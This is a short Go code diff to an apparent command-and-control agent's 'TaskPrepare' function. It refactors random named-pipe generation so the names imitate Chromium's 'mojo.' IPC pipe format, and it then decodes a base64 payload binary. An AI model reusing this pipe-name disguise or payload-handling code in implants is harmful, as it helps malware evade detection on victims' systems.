@@ -560,30 +560,23 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 		rand.Seed(time.Now().UnixNano())
 
 		const pipePrefix = "\\\\.\\pipe\\mojo."
-		var pipeRunes = []rune("0123456789")
+		const (
+			runeALen = 4
+			runeBLen = 4
+			runeCLen = 12
+			runeDLen = 7
+		)
 
-		runeA := make([]rune, 4)
-		runeB := make([]rune, 4)
-		runeC := make([]rune, 12)
-		runeD := make([]rune, 7)
-
-		for i := range runeA {
-			runeA[i] = pipeRunes[rand.Intn(len(pipeRunes))]
+		generateRuneString := func(length int) string {
+			pipeRunes := []rune("0123456789")
+			runes := make([]rune, length)
+			for i := range runes {
+				runes[i] = pipeRunes[rand.Intn(len(pipeRunes))]
+			}
+			return string(runes)
 		}
 
-		for i := range runeB {
-			runeB[i] = pipeRunes[rand.Intn(len(pipeRunes))]
-		}
-
-		for i := range runeC {
-			runeC[i] = pipeRunes[rand.Intn(len(pipeRunes))]
-		}
-
-		for i := range runeD {
-			runeD[i] = pipeRunes[rand.Intn(len(pipeRunes))]
-		}
-
-		finalPipe := pipePrefix + string(runeA) + string(runeB) + string(runeC) + string(runeD)
+		finalPipe := pipePrefix + generateRuneString(runeALen) + "." + generateRuneString(runeBLen) + "." + generateRuneString(runeCLen) + "." + generateRuneString(runeDLen)
 
 		var (
 			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
